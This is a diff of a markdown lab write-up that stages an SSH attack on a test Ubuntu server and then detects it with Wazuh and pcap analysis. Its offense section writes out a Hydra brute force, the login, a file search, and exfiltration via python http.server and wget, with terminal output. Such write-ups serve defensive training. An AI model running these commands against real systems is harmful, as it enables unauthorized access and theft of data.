@@ -2,25 +2,23 @@
 layout: default
 ---
 
-# TECH-BUREAU-SERIES
+# TECH-BUREAU SERIES
 
 ## PHASE 01: RECON/BRUTEFORCE/EXFILTRATION
 
 #### Whats Showcased
 <section>
-  <ul class="hover-card"> <li><strong>OFFENSE</strong> Target enumeration, SSH bruteforce, Data exfiltration </li>
+  <ul class="hover-card"> <li><span class=text-red><strong>OFFENSE:</strong></span><strong> Target enumeration, SSH bruteforce, Data exfiltration </li>
   </ul>
-  <ul class="hover-card"> <li><strong>DEFENSE</strong> Tuning Alerts to reduce noise, Comparing pcap file findings </li> 
+  <ul class="hover-card"> <li><span class=text-green><strong>DEFENSE:</strong></span> Tuning Alerts to reduce noise, Comparing pcap file findings </li> 
   </ul>
 </section>
 
-The initial Setup
+#### The initial Setup
 The Ubuntu server is configured via auditctl to watch a specific file in derectory – PROJECT.5527, any interaction with the containing schematic file will raise an alert.
 <<AUTDITCTL + LOCAL RULE>>
 The server firewall iptables is also watching for any suspicious incoming trafic to the main ports to try and raise the alert in case of an outside port scan.
 <<IPTABLES + LOCAL RULE>>
-
-
 
 # ADVERSARIES MOVE
 Without further ado. In this scenario we know the ip address of our target server and we got a username that we belive has a week password. <br>We assemble our handfull of penetraton tools and begin. 
@@ -46,7 +44,7 @@ We are interested in the port status, we are going for 4 ports in this scenario.
 We are looking for a bruteforce attack here. We confirm port 22 for SSH is up. <br>
 
 
-## SSH credential Hydra Attack
+## 02.SSH credential Hydra Attack
 <pre data-label="hydra bruteforce"><code>
 <span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$ hydra -l intern -P ROCK_YOU_10.txt ssh://TECH-BUREAU
 
@@ -63,7 +61,7 @@ Hydra finished at 2026-02-21 16:12:21
 Hydra is used for the SSH brute force, we use the username *intern* and a custom top 10 RockYou passwords file.</br>
 
 
-## SSH IN TO THE SERVER
+## 03.SSH IN TO THE SERVER
 <pre data-label="SSH"><code>
 <span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$ ssh intern@TECH-BUREAU
 intern@tech-bureau's password:<span class="orange"><strong>football</strong></span>
@@ -71,7 +69,7 @@ intern@tech-bureau's password:<span class="orange"><strong>football</strong></sp
 We SSH under the username *intern* the destination is **TECH-BUREAU** and the password we use is *football*.
 
 
-## TARGET FILE SEARCH
+## 04.TARGET FILE SEARCH
 <pre data-label="find the specs"><code>
 <span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home$ find . -type f -name "Frame*"
 find: ‘./lead_engineer/.cache’: Permission denied
@@ -83,7 +81,7 @@ find: ‘./lead_engineer/.ssh’: Permission denied
 We are in, using the *find* command we search for the file Frame_specs.txt
 
 
-## CHECK DIRECTORY AND CONCATINATE
+## 05.CHECK DIRECTORY AND CONCATINATE
 <pre data-label="ls and cat"><code>
 <span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/PROJECT.5527$ ls
 <span class="red"><strong>Frame_specs.txt</strong></span>
@@ -104,7 +102,7 @@ Result: less total weight, shorter cylinder stroke, and less wear and tear on pa
 We have changed the directory and located the coveted schematic. we use the humble *cat* command to confirm the data.
 
 
-## ESTABLISHING A PYTHON SERVER
+## 06.ESTABLISHING A PYTHON SERVER
 <pre data-label="http.server"><code>
 <span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/PROJECT.5527$ python3 -m http.server 8000
   
@@ -113,7 +111,7 @@ Serving HTTP on 0.0.0.0 port <span class="orange"><strong>8000</strong></span> (
 With the file confirmed we want to snatch it for our industrial espionage purpose. A quick and dirty way is to establish a simple HTTP server using python.
 
 
-## EXFILTRATE VIA ATTACK TERMINAL
+## 07.EXFILTRATE VIA ATTACK TERMINAL
 <pre data-label="wget"><code>
 <span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>~/BUREAU.01$ wget http://TECH-BUREAU:8000/Frame_specs.txt
 --2026-02-21 16:23:12--  http://tech-bureau:8000/Frame_specs.txt
@@ -129,7 +127,7 @@ Frame_specs.txt        <span class="orange"><strong>100%[=======================
 </code></pre>
 With the file confirmed safeley on our attack machine we are done with this server and its time to leave.
 
-## LEAVE
+## 08.LEAVE
 <pre data-label="exit"><code>
 <span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/PROJECT.5527$ exit
 logout
@@ -143,56 +141,71 @@ Thank You and Good Bye.
   <span class="line"></span>
 </div>
 # DEFENSES MOVE
-We did a little bit of tinkering before starting this scenario, and as a result we have catered alerts just for the occation. The firewall is checking for tcp packets to 4 specific ports. The auditctl is monitoring a particularly sensitive file on the server. Lets see if we were ready for an attack.
+We did a little bit of tinkering before starting this scenario, and as a result we have catered alerts just for the occation.<br>
+The firewall is checking for tcp packets to 4 specific ports. The auditctl is monitoring a particularly sensitive file on the server.<br>
+Lets see if we were ready for an attack.
+
 ## WAZUH ALERTS
 <img src="assets/images/tech-bureau/phase.01/10.wazuh-alerts.png">
 <small>“01.wazuh-alerts.png”<small>
 
+We can see the entierty of the attack presented in the alert sequence. From port enumiration to the SSH bruteforce,<br>
+to a succesfull login as user *intern*, followed by sensitive data being accesed and sent out, followed by an SSH session closed.
 
-## WAZUH PORTSCAN ALERT
+## 01.WAZUH PORTSCAN ALERT
 <img src="assets/images/tech-bureau/phase.01/11.wazuh-nmap.png">
 <small>“02.wazuh-nmap.png”<small>
   
 Observe the results of our custom rule, we can see cleaerly the attacker IP address, the machine being scanned and ofcource the port number, 443 in this case.
 
-## PCAP PORT-CROSS
+## 02.PCAP PORT-CROSS
 <img src="assets/images/tech-bureau/phase.01/15.pcap-nmap.png">
 <small>“03.pcap-nmap.png”<small>
   
 We can confirm the nmap scan on exactly 4 ports. I will point out the detail that to a [SYN] request ports 80 and 443 are giving out an immediate [RST, ACK] to a scan attempt proving that the ports are closed. Ports 22 and 3306 however give a sequence of  [SYN] → [SYN,ACK] → [ACK] → [RST,ACK] signifying a handshake and than a immediate drop from the portscanner.
 ####Port Scan Confirmed
 
-## WAZUH BRUTEFORCE ALERT
+## 03.WAZUH BRUTEFORCE ALERT
 <img src="assets/images/tech-bureau/phase.01/12.wazuh-hydra.png">
 <small>“04.wazuh-hydra.png”<small>
+
+Here we have a useful piece of data, the bruteforce is attempted as username *intern*.
   
-## PCAP BRUTE-CROSS
+## 04.PCAP BRUTE-CROSS
 <img src="assets/images/tech-bureau/phase.01/16.pcap-hydra.png">
 <small>“05.pcap-hydra.png”<small>
   
 With the hydra bruteforce we can simply observe the time signature and notice that a burst of 10 SSH protocol requests to the Ubuntu Server happening at the same time, followed by a series of key exchanges.
-####Brute Force Confirmed
+#### Brute Force Confirmed
 
-## WAZUH FILE OPENED ALERT
+## 05.WAZUH FILE OPENED ALERT
 <img src="assets/images/tech-bureau/phase.01/13.wazuh-cat.png">
 <small>“06.wazuh-cat.png”<small>
+
+Here we see Wazuh fiering off a rule based of auditctl monitoring a specific file on the server.
   
-## WAZUH EXFILTRATION ALERT
+## 06.WAZUH EXFILTRATION ALERT
 <img src="assets/images/tech-bureau/phase.01/14.wazuh-exfil.png">
 <small>“07.wazuh-exfil.png”<small>
+
+Our IPtables have been adjusted to catch any outgoing tcp traffic from port 8000.<br>
+We will take a look at the Wireshark traffic next.
   
-## PCAP EXFIL-CROSS
+## 07.PCAP EXFIL-CROSS
 <img src="assets/images/tech-bureau/phase.01/17.pcap-get-request.png">
 <small>“08.pcap-get-request.png”<small>
   
-## PCAP HTTP STREAM
+In the stream above we can observe a connection handshake followed by a **GET** request for the *Frame_specs file*,<br>
+followed by a [PHS,ACK] push, that's the moment our data is getting exfiltrated.<br>
+We than see an http code 200 and a connection closing sequence of [FIN,ACK] → [ACK] 2ice (graceful close)</br> 
+
+## 08.PCAP HTTP STREAM
 <img src="assets/images/tech-bureau/phase.01/18.pcap-exfil-clear.png">
 <small>“09.pcap-exfil-clear.png”<small>
-  
-In the HTTP stream we can observe a connection handshake followed by a GET request for the Frame_specs file,<br>
-followed by a [PHS,ACK] push, that's the moment our data is getting exfiltrated.<br>
-We than see an http code 200 and a connection closing sequence of  [FIN,ACK] → [ACK] 2ice (graceful close)</br>
-####DATA EXFILTRATED
+
+Since http is in question we can see the data leaving in clear text.
+
+#### DATA EXFILTRATED
 <div class="divider-wire">
   <span class="line"></span>
   <span class="symbol">⦿</span>
